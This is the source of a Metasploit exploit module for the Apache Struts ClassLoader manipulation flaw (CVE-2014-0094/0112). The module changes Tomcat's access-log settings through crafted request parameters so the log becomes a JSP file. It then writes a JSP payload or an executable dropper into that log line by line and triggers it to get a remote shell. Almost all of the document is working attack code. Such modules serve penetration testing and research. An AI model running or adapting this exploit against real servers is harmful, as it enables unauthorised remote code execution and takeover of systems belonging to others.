##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = ManualRanking # It's going to manipulate the Class Loader

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::EXE
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Apache Struts ClassLoader Manipulation Remote 
Code Execution',
      'Description'    => %q{
        This module exploits a remote command execution vulnerability in 
Apache Struts
        versions < 2.3.16.2. This issue is caused because the 
ParametersInterceptor allows
        access to 'class' parameter which is directly mapped to 
getClass() method and
        allows ClassLoader manipulation, which allows remote attackers 
to execute arbitrary
        Java code via crafted parameters.
      },
      'Author'         =>
        [
          'Mark Thomas', # Vulnerability Discovery
          'Przemyslaw Celej', # Vulnerability Discovery
          'pwntester <alvaro[at]pwntester.com>', # PoC
          'Redsadic <julian.vilas[at]gmail.com>' # Metasploit Module
        ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          ['CVE', '2014-0094'],
          ['CVE', '2014-0112'],
          ['URL', 
'http://www.pwntester.com/blog/2014/04/24/struts2-0day-in-the-wild/'],
          ['URL', 
'http://struts.apache.org/release/2.3.x/docs/s2-020.html']
        ],
      'Platform'       => %w{ linux win },
      'Payload'        =>
        {
          'Space' => 5000,
          'DisableNops' => true
        },
      'Targets'        =>
        [
          ['Java',
           {
               'Arch'     => ARCH_JAVA,
               'Platform' => %w{ linux win }
           },
          ],
          ['Linux',
           {
               'Arch'     => ARCH_X86,
               'Platform' => 'linux'
           }
          ],
          ['Windows',
            {
              'Arch'     => ARCH_X86,
              'Platform' => 'win'
            }
          ]
        ],
      'DisclosureDate' => 'Mar 06 2014',
      'DefaultTarget'  => 1))

      register_options(
        [
          Opt::RPORT(8080),
          OptString.new('TARGETURI', [ true, 'The path to a struts 
application action', "/struts2-blank/example/HelloWorld.action"])
        ], self.class)
  end

  def jsp_dropper(file, exe)
    dropper = <<-eos
<%@ page import=\"java.io.FileOutputStream\" %>
<%@ page import=\"sun.misc.BASE64Decoder\" %>
<%@ page import=\"java.io.File\" %>
<% FileOutputStream oFile = new FileOutputStream(\"#{file}\", false); %>
<% oFile.write(new 
sun.misc.BASE64Decoder().decodeBuffer(\"#{Rex::Text.encode_base64(exe)}\")); 
%>
<% oFile.flush(); %>
<% oFile.close(); %>
<% File f = new File(\"#{file}\"); %>
<% f.setExecutable(true); %>
<% Runtime.getRuntime().exec(\"./#{file}\"); %>
    eos

    dropper
  end

  def dump_line(uri, cmd = "")
    res = send_request_cgi({
      'uri'     => uri+cmd,
      'version' => '1.1',
      'method'  => 'GET',
    })

    res
  end

  def modify_class_loader(opts)
    res = send_request_cgi({
      'uri'     => normalize_uri(target_uri.path.to_s),
      'version' => '1.1',
      'method'  => 'GET',
      'vars_get' => {
        
"class['classLoader'].resources.context.parent.pipeline.first.directory"      
=> opts[:directory],
        
"class['classLoader'].resources.context.parent.pipeline.first.prefix"         
=> opts[:prefix],
        
"class['classLoader'].resources.context.parent.pipeline.first.suffix"         
=> opts[:suffix],
        
"class['classLoader'].resources.context.parent.pipeline.first.fileDateFormat" 
=> opts[:file_date_format]
      }
    })

    res
  end

  def check_log_file(hint)
    uri = normalize_uri("/", @jsp_file)

    print_status("#{peer} - Waiting for the server to flush the 
logfile")

    10.times do |x|
      select(nil, nil, nil, 2)

      # Now make a request to trigger payload
      vprint_status("#{peer} - Countdown #{10-x}...")
      res = dump_line(uri)

      # Failure. The request timed out or the server went away.
      fail_with(Failure::TimeoutExpired, "#{peer} - Not received 
response") if res.nil?

      # Success if the server has flushed all the sent commands to the 
jsp file
      if res.code == 200 && res.body && res.body.to_s =~ /#{hint}/
        print_good("#{peer} - Log file flushed at 
http://#{peer}/#{@jsp_file}")
        return true
      end
    end

    false
  end

  # Fix the JSP payload to make it valid once is dropped
  # to the log file
  def fix(jsp)
    output = ""
    jsp.each_line do |l|
      if l =~ /<%.*%>/
        output << l
      elsif l =~ /<%/
        next
      elsif l.chomp.empty?
        next
      else
        output << "<% #{l.chomp} %>"
      end
    end
    output
  end

  def create_jsp
    if target['Arch'] == ARCH_JAVA
      jsp = fix(payload.encoded)
    else
      payload_exe = generate_payload_exe
      payload_file = rand_text_alphanumeric(4 + rand(4))
      jsp = jsp_dropper(payload_file, payload_exe)
      register_files_for_cleanup(payload_file)
    end

    jsp
  end

  def exploit
    prefix_jsp = rand_text_alphanumeric(3+rand(3))
    date_format = rand_text_numeric(1+rand(4))
    @jsp_file = prefix_jsp + date_format + ".jsp"

    # Modify the Class Loader

    print_status("#{peer} - Modifying Class Loader...")
    properties = {
      :directory      => 'webapps/ROOT',
      :prefix         => prefix_jsp,
      :suffix         => '.jsp',
      :file_date_format => date_format
    }
    res = modify_class_loader(properties)
    unless res
      fail_with(Failure::TimeoutExpired, "#{peer} - No answer")
    end

    # Check if the log file exists and hass been flushed

    if check_log_file(normalize_uri(target_uri.to_s))
      register_files_for_cleanup(@jsp_file)
    else
      fail_with(Failure::Unknown, "#{peer} - The log file hasn't been 
flushed")
    end

    # Prepare the JSP
    print_status("#{peer} - Generating JSP...")
    jsp = create_jsp

    # Dump the JSP to the log file
    print_status("#{peer} - Dumping JSP into the logfile...")
    random_request = rand_text_alphanumeric(3 + rand(3))
    jsp.each_line do |l|
      unless dump_line(random_request, l.chomp)
        fail_with(Failure::Unknown, "#{peer} - Missed answer while 
dumping JSP to logfile...")
      end
    end

    # Check log file... enjoy shell!
    check_log_file(random_request)

    # No matter what happened, try to 'restore' the Class Loader
    properties = {
        :directory      => '',
        :prefix         => '',
        :suffix         => '',
        :file_date_format => ''
    }
    modify_class_loader(properties)
  end

end

